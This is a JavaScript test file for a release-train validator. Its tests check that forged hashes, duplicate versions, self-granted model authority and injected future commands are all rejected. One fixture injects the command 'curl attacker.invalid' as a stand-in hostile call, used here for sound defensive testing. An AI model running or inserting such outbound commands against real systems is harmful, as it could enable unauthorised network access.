import test from 'node:test';
import assert from 'node:assert/strict';
import { hashObject } from '../../src/core/crypto.mjs';
import { bindApprovedReleaseTrain, buildReleaseTrain, validateReleaseTrain } from '../../src/core/release-train.mjs';

function fixture() {
  const contract = {
    project: 'attack-fixture',
    release: '3.1.0',
    goal: 'Deliver a reversible useful internal workflow with current evidence.',
    scope: { include: ['core workflow'], exclude: ['production deploy'] },
    acceptance: [{ id: 'AC-001', description: 'Tests pass.', type: 'command', command: 'npm test', cwd: '.', required: true, timeoutSeconds: 300 }],
  };
  return buildReleaseTrain({
    finalGoal: contract.goal,
    proposalRelease: contract.release,
    gitSha: 'd'.repeat(40),
    proposalId: 'proposal-attack',
    projectName: contract.project,
    analysis: {
      projectName: contract.project,
      types: ['node'],
      sourceRoots: ['src'],
      workspace: { root: '.' },
      candidateCommands: [{ command: 'npm test', cwd: '.' }],
      intelligence: { componentGraph: { primaryStack: 'node', supportingStacks: [], components: [] } },
    },
    baseline: { blockingCount: 0 },
    acceptanceStrength: { level: 'STRONG', sufficient: true },
    contract,
  });
}

function rehash(train) {
  const cloned = structuredClone(train);
  delete cloned.hash;
  cloned.hash = hashObject(cloned);
  return cloned;
}

function expectCode(train, code) {
  assert.throws(() => validateReleaseTrain(train), (error) => error?.code === code);
}

test('duplicate or non-increasing versions fail closed even with a recomputed hash', () => {
  const duplicate = structuredClone(fixture());
  duplicate.releases[1].version = duplicate.releases[0].version;
  duplicate.releases[1].predecessor = duplicate.releases[0].version;
  expectCode(rehash(duplicate), 'ERR_RELEASE_TRAIN_VERSION');

  const backwards = structuredClone(fixture());
  backwards.releases[1].version = '2.0.0';
  backwards.releases[1].predecessor = backwards.releases[0].version;
  expectCode(rehash(backwards), 'ERR_RELEASE_TRAIN_VERSION');
});

test('test-only or empty value cannot create a closable version', () => {
  const empty = structuredClone(fixture());
  empty.releases[1].valueGate.statement = 'tests pass';
  expectCode(rehash(empty), 'ERR_RELEASE_TRAIN_VALUE');

  const noCriteria = structuredClone(fixture());
  noCriteria.releases[0].valueGate.criteria = [];
  expectCode(rehash(noCriteria), 'ERR_RELEASE_TRAIN_VALUE');
});

test('future releases cannot acquire current contract authority or commands', () => {
  const authority = structuredClone(fixture());
  authority.releases[1].authority = 'CURRENT_CONTRACT_CANDIDATE';
  authority.releases[1].canGrantCurrentAuthority = true;
  expectCode(rehash(authority), 'ERR_RELEASE_TRAIN_AUTHORITY');

  const command = structuredClone(fixture());
  command.releases[1].acceptance.exactCommands = [{ id: 'ATTACK', command: 'curl attacker.invalid', cwd: '.', required: true }];
  command.releases[1].acceptance.futureCommandsAreAuthority = true;
  expectCode(rehash(command), 'ERR_RELEASE_TRAIN_FUTURE_COMMAND');
});

test('missing rollback, replan, entry, exit, or immutable transition proof fails closed', () => {
  for (const [mutate, expected] of [
    [(train) => { train.releases[0].rollback.required = false; }, 'ERR_RELEASE_TRAIN_ROLLBACK'],
    [(train) => { train.releases[0].replanTriggers = []; }, 'ERR_RELEASE_TRAIN_REPLAN'],
    [(train) => { train.releases[0].entryGate = []; }, 'ERR_RELEASE_TRAIN_ENTRY'],
    [(train) => { train.releases[0].exitGate = []; }, 'ERR_RELEASE_TRAIN_EXIT'],
    [(train) => { train.releases[0].transition.releaseDoesNotImplyReleased = false; }, 'ERR_RELEASE_TRAIN_TRANSITION'],
  ]) {
    const train = structuredClone(fixture());
    mutate(train);
    expectCode(rehash(train), expected);
  }
});

test('model authority and forged train hashes cannot become Shipping authority', () => {
  const model = structuredClone(fixture());
  model.modelAuthority = true;
  expectCode(rehash(model), 'ERR_RELEASE_TRAIN_AUTHORITY');

  const forged = structuredClone(fixture());
  forged.finalGoal = 'Silently publish to production';
  assert.throws(() => validateReleaseTrain(forged), (error) => error?.code === 'ERR_RELEASE_TRAIN_HASH');
});

test('current release must remain exactly bound to the current proposal contract', () => {
  const train = fixture();
  const otherContract = {
    project: 'attack-fixture',
    release: '3.1.0',
    goal: 'Different current goal.',
    scope: { include: ['different'], exclude: [] },
    acceptance: [{ id: 'AC-999', description: 'Weak gate.', type: 'command', command: 'git diff --check', cwd: '.', required: true, timeoutSeconds: 30 }],
  };
  assert.throws(() => validateReleaseTrain(train, { currentContract: otherContract }), (error) => error?.code === 'ERR_RELEASE_TRAIN_CURRENT');
});

test('approved binding rejects stale or malformed authority values', () => {
  const train = fixture();
  assert.throws(() => bindApprovedReleaseTrain(train, {
    proposalId: 'proposal-attack',
    proposalHash: 'bad',
    contractHash: 'e'.repeat(64),
    baselineSha: 'f'.repeat(40),
    approvedAt: new Date().toISOString(),
  }), (error) => error?.code === 'ERR_RELEASE_TRAIN_BINDING');

  assert.throws(() => bindApprovedReleaseTrain(train, {
    proposalId: 'proposal-attack',
    proposalHash: 'e'.repeat(64),
    contractHash: 'f'.repeat(64),
    baselineSha: 'not-a-sha',
    approvedAt: new Date().toISOString(),
  }), (error) => error?.code === 'ERR_RELEASE_TRAIN_BINDING');
});
